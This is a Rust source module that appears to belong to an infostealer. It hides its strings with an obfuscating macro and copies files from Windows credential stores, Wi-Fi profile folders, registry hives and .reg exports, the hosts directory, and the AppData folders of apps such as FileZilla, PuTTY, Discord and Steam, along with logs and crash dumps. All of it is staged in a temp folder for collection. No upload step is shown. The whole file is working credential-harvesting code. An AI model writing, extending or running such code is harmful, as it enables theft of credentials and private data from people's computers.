use crate::sprotect;
use std::fs;
use std::path::PathBuf;
use crate::docs::file_types::{should_extract_file, has_sensitive_name};

fn copy_file_if_exists(src: &PathBuf, dest_dir: &PathBuf, category: &str) -> bool {
    if src.exists() && src.is_file() {
        if let Ok(metadata) = fs::metadata(src) {
            let file_size = metadata.len();
            if let Some(filename) = src.file_name() {
                let src_str = src.to_string_lossy().to_string();
                if should_extract_file(&src_str, file_size) || has_sensitive_name(&src_str) {
                    let category_dir = dest_dir.join(category);
                    if fs::create_dir_all(&category_dir).is_ok() {
                        let dest_path = category_dir.join(filename);
                        return fs::copy(src, dest_path).is_ok();
                    }
                }
            }
        }
    }
    false
}

fn scan_directory_shallow(dir: &PathBuf, dest_dir: &PathBuf, category: &str, max_files: u32) -> u32 {
    if !dir.exists() {
        return 0;
    }
    
    let mut files_copied = 0;
    
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            if files_copied >= max_files {
                break;
            }
            
            let path = entry.path();
            if path.is_file() {
                if copy_file_if_exists(&path, dest_dir, category) {
                    files_copied += 1;
                }
            }
        }
    }
    
    files_copied
}

async fn extract_system_configs(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    let system_config_paths = vec![
        PathBuf::from(sprotect!("C:\\Windows\\System32\\drivers\\etc")),
        PathBuf::from(sprotect!("C:\\Windows\\System32\\config")),
        PathBuf::from(sprotect!("C:\\ProgramData")),
    ];
    
    for config_path in system_config_paths {
        if config_path.exists() {
            let category_str = sprotect!("SystemConfig");
            let category = config_path.file_name()
                .and_then(|n| n.to_str())
                .unwrap_or(&category_str);
            files_copied += scan_directory_shallow(&config_path, dest_dir, category, 50);
        }
    }
    
    files_copied
}

async fn extract_application_configs(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let base_path = PathBuf::from(&userprofile);
        
        let app_config_paths = vec![
            base_path.join(sprotect!("AppData\\Roaming")),
            base_path.join(sprotect!("AppData\\Local")),
        ];
        
        for app_path in app_config_paths {
            if app_path.exists() {
                if let Ok(entries) = fs::read_dir(&app_path) {
                    for entry in entries.flatten().take(100) {
                        let path = entry.path();
                        if path.is_dir() {
                            let dirname = path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("")
                                .to_lowercase();
                            
                            let interesting_apps = vec![
                                sprotect!("notepad"), sprotect!("code"), sprotect!("atom"),
                                sprotect!("sublime"), sprotect!("filezilla"), sprotect!("putty"),
                                sprotect!("winrar"), sprotect!("7-zip"), sprotect!("vlc"),
                                sprotect!("obs"), sprotect!("discord"), sprotect!("steam"),
                            ];
                            
                            if interesting_apps.iter().any(|app| dirname.contains(app.as_str())) {
                                files_copied += scan_directory_shallow(&path, dest_dir, &dirname, 20);
                            }
                        }
                    }
                }
            }
        }
    }
    
    files_copied
}

async fn extract_log_files(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    let log_paths = vec![
        PathBuf::from(sprotect!("C:\\Windows\\Logs")),
        PathBuf::from(sprotect!("C:\\ProgramData\\Microsoft\\Windows\\WER")),
        PathBuf::from(sprotect!("C:\\Windows\\Debug")),
    ];
    
    for log_path in log_paths {
        if log_path.exists() {
            files_copied += scan_directory_shallow(&log_path, dest_dir, &sprotect!("SystemLogs"), 30);
        }
    }
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let user_log_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Local\\Temp")),
            PathBuf::from(&userprofile).join(sprotect!("AppData\\LocalLow")),
        ];
        
        for log_path in user_log_paths {
            if log_path.exists() {
                if let Ok(entries) = fs::read_dir(&log_path) {
                    for entry in entries.flatten().take(50) {
                        let path = entry.path();
                        if path.is_file() {
                            let filename = path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("")
                                .to_lowercase();
                            
                            if filename.contains(sprotect!("log").as_str()) || 
                               filename.contains(sprotect!("crash").as_str()) ||
                               filename.contains(sprotect!("dump").as_str()) {
                                if copy_file_if_exists(&path, dest_dir, &sprotect!("UserLogs")) {
                                    files_copied += 1;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    files_copied
}

async fn extract_registry_exports(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let registry_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("Documents\\registry")),
            PathBuf::from(&userprofile).join(sprotect!("Desktop\\*.reg")),
            PathBuf::from(&userprofile).join(sprotect!("Downloads\\*.reg")),
        ];
        
        for reg_path in registry_paths {
            if let Some(parent) = reg_path.parent() {
                if parent.exists() {
                    if let Ok(entries) = fs::read_dir(parent) {
                        for entry in entries.flatten().take(20) {
                            let path = entry.path();
                            if path.is_file() {
                                if let Some(ext) = path.extension() {
                                    if ext == &*sprotect!("reg") {
                                        if copy_file_if_exists(&path, dest_dir, &sprotect!("Registry")) {
                                            files_copied += 1;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
    files_copied
}

async fn extract_network_configs(dest_dir: &PathBuf) -> u32 {
    let mut files_copied = 0;
    
    if let Ok(userprofile) = std::env::var(sprotect!("USERPROFILE")) {
        let network_paths = vec![
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Roaming\\Microsoft\\Network")),
            PathBuf::from(&userprofile).join(sprotect!("AppData\\Local\\Microsoft\\Credentials")),
        ];
        
        for net_path in network_paths {
            if net_path.exists() {
                files_copied += scan_directory_shallow(&net_path, dest_dir, &sprotect!("Network"), 25);
            }
        }
    }
    
    let system_network_paths = vec![
        PathBuf::from(sprotect!("C:\\ProgramData\\Microsoft\\Wlansvc")),
        PathBuf::from(sprotect!("C:\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials")),
    ];
    
    for sys_net_path in system_network_paths {
        if sys_net_path.exists() {
            files_copied += scan_directory_shallow(&sys_net_path, dest_dir, &sprotect!("SystemNetwork"), 15);
        }
    }
    
    files_copied
}

pub async fn extract_system_documents() -> Result<(), Box<dyn std::error::Error>> {
    let base_output = PathBuf::from(sprotect!("C:\\temp\\extract\\docs"));
    fs::create_dir_all(&base_output).ok();
    
    let mut total_extracted = 0;
    
    total_extracted += extract_system_configs(&base_output).await;
    total_extracted += extract_application_configs(&base_output).await;
    total_extracted += extract_log_files(&base_output).await;
    total_extracted += extract_registry_exports(&base_output).await;
    total_extracted += extract_network_configs(&base_output).await;
    
    if total_extracted == 0 {
        fs::remove_dir_all(&base_output).ok();
    }
    
    Ok(())
}